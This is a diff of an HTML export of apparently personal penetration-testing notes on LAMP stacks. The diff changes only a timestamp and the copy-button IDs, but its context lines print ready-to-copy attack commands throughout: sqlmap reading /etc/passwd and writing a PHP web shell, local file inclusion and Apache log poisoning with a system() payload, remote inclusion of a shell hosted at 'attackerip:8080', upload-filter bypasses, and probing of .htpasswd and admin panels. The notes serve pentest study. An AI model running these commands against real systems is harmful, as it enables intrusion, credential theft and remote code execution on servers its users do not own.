@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 14:11 -->
+<!-- 2026-07-20 Mon 15:41 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>LAMP Stack</title>
@@ -955,7 +955,7 @@ Related: <a href="../org/20260611T064753--web-application-testing-methodology__c
 <div id="outline-container-org4a55195" class="outline-2">
 <h2 id="org4a55195">Architecture</h2>
 <div class="outline-text-2" id="text-org4a55195">
-<pre class="example" id="org5b1bc7e">
+<pre class="example" id="org41eb2fa">
 Browser → Apache → PHP → MySQL
 </pre>
 
@@ -981,11 +981,11 @@ MySQL queries, making SQLi extremely common in LAMP applications.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_79c50aeb2eae4e8e9c5c7d0b392af1ee>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ff4ebeb5794c47078bb0c5bf6b51e5a4>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_79c50aeb2eae4e8e9c5c7d0b392af1ee=document.querySelector('button[name=btn_79c50aeb2eae4e8e9c5c7d0b392af1ee]');
-copyBtnbtn_79c50aeb2eae4e8e9c5c7d0b392af1ee.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Test manually\ncurl \"http://$IP/page.php?id=1'\"\n\n# Automated\nsqlmap -u \"http://$IP/page.php?id=1\" --dbs\n`);copyBtnbtn_79c50aeb2eae4e8e9c5c7d0b392af1ee.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_79c50aeb2eae4e8e9c5c7d0b392af1ee.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ff4ebeb5794c47078bb0c5bf6b51e5a4=document.querySelector('button[name=btn_ff4ebeb5794c47078bb0c5bf6b51e5a4]');
+copyBtnbtn_ff4ebeb5794c47078bb0c5bf6b51e5a4.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Test manually\ncurl \"http://$IP/page.php?id=1'\"\n\n# Automated\nsqlmap -u \"http://$IP/page.php?id=1\" --dbs\n`);copyBtnbtn_ff4ebeb5794c47078bb0c5bf6b51e5a4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ff4ebeb5794c47078bb0c5bf6b51e5a4.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1003,11 +1003,11 @@ write:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_febd280731c84ee7b27135ed49f485f8>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2e77fec1d2f24d6e96df345e37e69b33>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_febd280731c84ee7b27135ed49f485f8=document.querySelector('button[name=btn_febd280731c84ee7b27135ed49f485f8]');
-copyBtnbtn_febd280731c84ee7b27135ed49f485f8.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Read a file via SQLi\nsqlmap -u \"http://$IP/page.php?id=1\" \\\n  --file-read=\"/etc/passwd\"\n\n# Write a web shell via SQLi (requires FILE privilege and writable path)\nsqlmap -u \"http://$IP/page.php?id=1\" \\\n  --file-write=\"shell.php\" \\\n  --file-dest=\"/var/www/html/shell.php\"\n`);copyBtnbtn_febd280731c84ee7b27135ed49f485f8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_febd280731c84ee7b27135ed49f485f8.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2e77fec1d2f24d6e96df345e37e69b33=document.querySelector('button[name=btn_2e77fec1d2f24d6e96df345e37e69b33]');
+copyBtnbtn_2e77fec1d2f24d6e96df345e37e69b33.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Read a file via SQLi\nsqlmap -u \"http://$IP/page.php?id=1\" \\\n  --file-read=\"/etc/passwd\"\n\n# Write a web shell via SQLi (requires FILE privilege and writable path)\nsqlmap -u \"http://$IP/page.php?id=1\" \\\n  --file-write=\"shell.php\" \\\n  --file-dest=\"/var/www/html/shell.php\"\n`);copyBtnbtn_2e77fec1d2f24d6e96df345e37e69b33.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2e77fec1d2f24d6e96df345e37e69b33.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1037,11 +1037,11 @@ file path. This is one of the most common LAMP vulnerabilities.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_567e6fec312d43c287432cd6449f71fd>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_dc1c255eb0e44d8886c0b91e5ff3b6a2>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_567e6fec312d43c287432cd6449f71fd=document.querySelector('button[name=btn_567e6fec312d43c287432cd6449f71fd]');
-copyBtnbtn_567e6fec312d43c287432cd6449f71fd.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Basic LFI\ncurl \"http://$IP/page.php?file=../../../../etc/passwd\"\n\n# PHP filter wrapper — read PHP source as base64\ncurl \"http://$IP/page.php?file=php://filter/convert.base64-encode/resource=config.php\"\n\n# Log poisoning via LFI — inject PHP into Apache access log then include it\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://$IP/\ncurl \"http://$IP/page.php?file=../../../../var/log/apache2/access.log&cmd=id\"\n`);copyBtnbtn_567e6fec312d43c287432cd6449f71fd.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_567e6fec312d43c287432cd6449f71fd.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_dc1c255eb0e44d8886c0b91e5ff3b6a2=document.querySelector('button[name=btn_dc1c255eb0e44d8886c0b91e5ff3b6a2]');
+copyBtnbtn_dc1c255eb0e44d8886c0b91e5ff3b6a2.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Basic LFI\ncurl \"http://$IP/page.php?file=../../../../etc/passwd\"\n\n# PHP filter wrapper — read PHP source as base64\ncurl \"http://$IP/page.php?file=php://filter/convert.base64-encode/resource=config.php\"\n\n# Log poisoning via LFI — inject PHP into Apache access log then include it\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://$IP/\ncurl \"http://$IP/page.php?file=../../../../var/log/apache2/access.log&cmd=id\"\n`);copyBtnbtn_dc1c255eb0e44d8886c0b91e5ff3b6a2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_dc1c255eb0e44d8886c0b91e5ff3b6a2.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1128,11 +1128,11 @@ execute remote files:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_02bb7364a55f4f3e9c3f7a37761f2fbd>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_9d17e52405fb4d0c8aab40e873257350>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_02bb7364a55f4f3e9c3f7a37761f2fbd=document.querySelector('button[name=btn_02bb7364a55f4f3e9c3f7a37761f2fbd]');
-copyBtnbtn_02bb7364a55f4f3e9c3f7a37761f2fbd.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Host a PHP shell on your attacking machine\necho '<?php system($_GET[\"cmd\"]); ?>' > shell.php\npython3 -m http.server 8080\n\n# Include it remotely\ncurl \"http://$IP/page.php?file=http://attackerip:8080/shell.php&cmd=id\"\n`);copyBtnbtn_02bb7364a55f4f3e9c3f7a37761f2fbd.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_02bb7364a55f4f3e9c3f7a37761f2fbd.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_9d17e52405fb4d0c8aab40e873257350=document.querySelector('button[name=btn_9d17e52405fb4d0c8aab40e873257350]');
+copyBtnbtn_9d17e52405fb4d0c8aab40e873257350.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Host a PHP shell on your attacking machine\necho '<?php system($_GET[\"cmd\"]); ?>' > shell.php\npython3 -m http.server 8080\n\n# Include it remotely\ncurl \"http://$IP/page.php?file=http://attackerip:8080/shell.php&cmd=id\"\n`);copyBtnbtn_9d17e52405fb4d0c8aab40e873257350.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9d17e52405fb4d0c8aab40e873257350.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1155,11 +1155,11 @@ web-accessible path, a web shell gives code execution:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ada54c539e6f49068b25e36d0012b407>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_de3424e4f4f749479ece71bfcfad046d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ada54c539e6f49068b25e36d0012b407=document.querySelector('button[name=btn_ada54c539e6f49068b25e36d0012b407]');
-copyBtnbtn_ada54c539e6f49068b25e36d0012b407.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Simple web shell\necho '<?php system($_GET[\"cmd\"]); ?>' > shell.php\n\n# Upload via vulnerable form or SQLi file-write\n# Then execute commands\ncurl \"http://$IP/uploads/shell.php?cmd=id\"\ncurl \"http://$IP/uploads/shell.php?cmd=cat+/etc/passwd\"\n`);copyBtnbtn_ada54c539e6f49068b25e36d0012b407.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ada54c539e6f49068b25e36d0012b407.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_de3424e4f4f749479ece71bfcfad046d=document.querySelector('button[name=btn_de3424e4f4f749479ece71bfcfad046d]');
+copyBtnbtn_de3424e4f4f749479ece71bfcfad046d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Simple web shell\necho '<?php system($_GET[\"cmd\"]); ?>' > shell.php\n\n# Upload via vulnerable form or SQLi file-write\n# Then execute commands\ncurl \"http://$IP/uploads/shell.php?cmd=id\"\ncurl \"http://$IP/uploads/shell.php?cmd=cat+/etc/passwd\"\n`);copyBtnbtn_de3424e4f4f749479ece71bfcfad046d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_de3424e4f4f749479ece71bfcfad046d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1182,11 +1182,11 @@ PHP file upload filters are frequently bypassable:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_575f7f95b9b74e25b5c5512d3b5f002a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2938ee73189d4182b10c9e035767d316>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_575f7f95b9b74e25b5c5512d3b5f002a=document.querySelector('button[name=btn_575f7f95b9b74e25b5c5512d3b5f002a]');
-copyBtnbtn_575f7f95b9b74e25b5c5512d3b5f002a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Change extension but keep PHP content\nmv shell.php shell.php.jpg\n\n# Double extension\nmv shell.php shell.jpg.php\n\n# Null byte (older PHP versions)\ncurl -F \"file=@shell.php%00.jpg\" http://$IP/upload.php\n\n# Change Content-Type header to image/jpeg\ncurl -X POST http://$IP/upload.php \\\n  -F \"file=@shell.php;type=image/jpeg\"\n`);copyBtnbtn_575f7f95b9b74e25b5c5512d3b5f002a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_575f7f95b9b74e25b5c5512d3b5f002a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2938ee73189d4182b10c9e035767d316=document.querySelector('button[name=btn_2938ee73189d4182b10c9e035767d316]');
+copyBtnbtn_2938ee73189d4182b10c9e035767d316.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Change extension but keep PHP content\nmv shell.php shell.php.jpg\n\n# Double extension\nmv shell.php shell.jpg.php\n\n# Null byte (older PHP versions)\ncurl -F \"file=@shell.php%00.jpg\" http://$IP/upload.php\n\n# Change Content-Type header to image/jpeg\ncurl -X POST http://$IP/upload.php \\\n  -F \"file=@shell.php;type=image/jpeg\"\n`);copyBtnbtn_2938ee73189d4182b10c9e035767d316.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2938ee73189d4182b10c9e035767d316.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1217,11 +1217,11 @@ Apache configuration issues are common attack paths:
 <li><code>.htaccess</code> files may be readable — check directly:</li>
 </ul>
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7260a5fff475446e8214fad3a27137b1>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0a9b38ee7c464d42b8cd50cc15a41ad8>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7260a5fff475446e8214fad3a27137b1=document.querySelector('button[name=btn_7260a5fff475446e8214fad3a27137b1]');
-copyBtnbtn_7260a5fff475446e8214fad3a27137b1.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl http://$IP/.htaccess\ncurl http://$IP/.htpasswd\n`);copyBtnbtn_7260a5fff475446e8214fad3a27137b1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7260a5fff475446e8214fad3a27137b1.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0a9b38ee7c464d42b8cd50cc15a41ad8=document.querySelector('button[name=btn_0a9b38ee7c464d42b8cd50cc15a41ad8]');
+copyBtnbtn_0a9b38ee7c464d42b8cd50cc15a41ad8.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl http://$IP/.htaccess\ncurl http://$IP/.htpasswd\n`);copyBtnbtn_0a9b38ee7c464d42b8cd50cc15a41ad8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0a9b38ee7c464d42b8cd50cc15a41ad8.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1234,11 +1234,11 @@ curl http://$<span style="color: var(--clr-variable); background-color: var(--bg
 <li>Directory listing enabled — browse for sensitive files:</li>
 </ul>
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_49cc669281ae44d5bed1158b1da8d48d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_5fb676f2c6f946c8b0bd43f285041508>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_49cc669281ae44d5bed1158b1da8d48d=document.querySelector('button[name=btn_49cc669281ae44d5bed1158b1da8d48d]');
-copyBtnbtn_49cc669281ae44d5bed1158b1da8d48d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl http://$IP/uploads/\ncurl http://$IP/backup/\n`);copyBtnbtn_49cc669281ae44d5bed1158b1da8d48d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_49cc669281ae44d5bed1158b1da8d48d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_5fb676f2c6f946c8b0bd43f285041508=document.querySelector('button[name=btn_5fb676f2c6f946c8b0bd43f285041508]');
+copyBtnbtn_5fb676f2c6f946c8b0bd43f285041508.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl http://$IP/uploads/\ncurl http://$IP/backup/\n`);copyBtnbtn_5fb676f2c6f946c8b0bd43f285041508.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5fb676f2c6f946c8b0bd43f285041508.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1252,11 +1252,11 @@ curl http://$<span style="color: var(--clr-variable); background-color: var(--bg
 requests and server info:</li>
 </ul>
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e47446c69b664082b6c5fc6adbabe266>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_685191fa641a4fc1a363dad6977cdd31>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e47446c69b664082b6c5fc6adbabe266=document.querySelector('button[name=btn_e47446c69b664082b6c5fc6adbabe266]');
-copyBtnbtn_e47446c69b664082b6c5fc6adbabe266.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl http://$IP/server-status\n`);copyBtnbtn_e47446c69b664082b6c5fc6adbabe266.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e47446c69b664082b6c5fc6adbabe266.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_685191fa641a4fc1a363dad6977cdd31=document.querySelector('button[name=btn_685191fa641a4fc1a363dad6977cdd31]');
+copyBtnbtn_685191fa641a4fc1a363dad6977cdd31.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl http://$IP/server-status\n`);copyBtnbtn_685191fa641a4fc1a363dad6977cdd31.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_685191fa641a4fc1a363dad6977cdd31.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1326,11 +1326,11 @@ Dangerous <code>php.ini</code> settings worth checking for:
 Trigger PHP errors to check <code>display_errors</code>:
 </p>
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_85a4a0f46c344857863e7df370db7219>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_01cf460df1474e748e1f16705fa93c95>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_85a4a0f46c344857863e7df370db7219=document.querySelector('button[name=btn_85a4a0f46c344857863e7df370db7219]');
-copyBtnbtn_85a4a0f46c344857863e7df370db7219.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl \"http://$IP/page.php?id='\"\n`);copyBtnbtn_85a4a0f46c344857863e7df370db7219.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_85a4a0f46c344857863e7df370db7219.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_01cf460df1474e748e1f16705fa93c95=document.querySelector('button[name=btn_01cf460df1474e748e1f16705fa93c95]');
+copyBtnbtn_01cf460df1474e748e1f16705fa93c95.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl \"http://$IP/page.php?id='\"\n`);copyBtnbtn_01cf460df1474e748e1f16705fa93c95.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_01cf460df1474e748e1f16705fa93c95.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1348,11 +1348,11 @@ without encoding. Test all parameters:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d43e14a746054cb7a72991ddafc5bcbc>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_25584902d0f8431683631cd1071ea16a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_d43e14a746054cb7a72991ddafc5bcbc=document.querySelector('button[name=btn_d43e14a746054cb7a72991ddafc5bcbc]');
-copyBtnbtn_d43e14a746054cb7a72991ddafc5bcbc.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl \"http://$IP/search.php?q=<script>alert(1)</script>\"\n`);copyBtnbtn_d43e14a746054cb7a72991ddafc5bcbc.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d43e14a746054cb7a72991ddafc5bcbc.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_25584902d0f8431683631cd1071ea16a=document.querySelector('button[name=btn_25584902d0f8431683631cd1071ea16a]');
+copyBtnbtn_25584902d0f8431683631cd1071ea16a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl \"http://$IP/search.php?q=<script>alert(1)</script>\"\n`);copyBtnbtn_25584902d0f8431683631cd1071ea16a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_25584902d0f8431683631cd1071ea16a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1374,11 +1374,11 @@ database management and left accessible:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ef0b4b0969434eacb1041019a4ce52ba>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_5c3de548f433403b91526d5bc56e3f50>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ef0b4b0969434eacb1041019a4ce52ba=document.querySelector('button[name=btn_ef0b4b0969434eacb1041019a4ce52ba]');
-copyBtnbtn_ef0b4b0969434eacb1041019a4ce52ba.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Common paths\ncurl http://$IP/phpmyadmin/\ncurl http://$IP/pma/\ncurl http://$IP/mysql/\n`);copyBtnbtn_ef0b4b0969434eacb1041019a4ce52ba.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ef0b4b0969434eacb1041019a4ce52ba.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_5c3de548f433403b91526d5bc56e3f50=document.querySelector('button[name=btn_5c3de548f433403b91526d5bc56e3f50]');
+copyBtnbtn_5c3de548f433403b91526d5bc56e3f50.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Common paths\ncurl http://$IP/phpmyadmin/\ncurl http://$IP/pma/\ncurl http://$IP/mysql/\n`);copyBtnbtn_5c3de548f433403b91526d5bc56e3f50.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5c3de548f433403b91526d5bc56e3f50.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1404,11 +1404,11 @@ LAMP stacks frequently run WordPress, Joomla, or Drupal. Check:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_5cf47abda9744e0fade07cae80a7c24b>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b6f8a380cf63423ea763648b577c8492>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_5cf47abda9744e0fade07cae80a7c24b=document.querySelector('button[name=btn_5cf47abda9744e0fade07cae80a7c24b]');
-copyBtnbtn_5cf47abda9744e0fade07cae80a7c24b.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# WordPress detection\ncurl http://$IP/wp-login.php\ncurl http://$IP/wp-admin/\ncurl http://$IP/xmlrpc.php\n\n# WPScan for WordPress enumeration\nwpscan --url http://$IP --enumerate u,p,t\n`);copyBtnbtn_5cf47abda9744e0fade07cae80a7c24b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5cf47abda9744e0fade07cae80a7c24b.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_b6f8a380cf63423ea763648b577c8492=document.querySelector('button[name=btn_b6f8a380cf63423ea763648b577c8492]');
+copyBtnbtn_b6f8a380cf63423ea763648b577c8492.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# WordPress detection\ncurl http://$IP/wp-login.php\ncurl http://$IP/wp-admin/\ncurl http://$IP/xmlrpc.php\n\n# WPScan for WordPress enumeration\nwpscan --url http://$IP --enumerate u,p,t\n`);copyBtnbtn_b6f8a380cf63423ea763648b577c8492.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b6f8a380cf63423ea763648b577c8492.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1441,11 +1441,11 @@ applications</li>
 </ul>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_02d4e8154f0347049ea16659b6fd8706>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_bf35bac8713d48e798085bd2ad1982a5>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_02d4e8154f0347049ea16659b6fd8706=document.querySelector('button[name=btn_02d4e8154f0347049ea16659b6fd8706]');
-copyBtnbtn_02d4e8154f0347049ea16659b6fd8706.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`feroxbuster -u http://$IP \\\n  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak,old,zip,tar.gz\n`);copyBtnbtn_02d4e8154f0347049ea16659b6fd8706.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_02d4e8154f0347049ea16659b6fd8706.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_bf35bac8713d48e798085bd2ad1982a5=document.querySelector('button[name=btn_bf35bac8713d48e798085bd2ad1982a5]');
+copyBtnbtn_bf35bac8713d48e798085bd2ad1982a5.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`feroxbuster -u http://$IP \\\n  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak,old,zip,tar.gz\n`);copyBtnbtn_bf35bac8713d48e798085bd2ad1982a5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_bf35bac8713d48e798085bd2ad1982a5.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
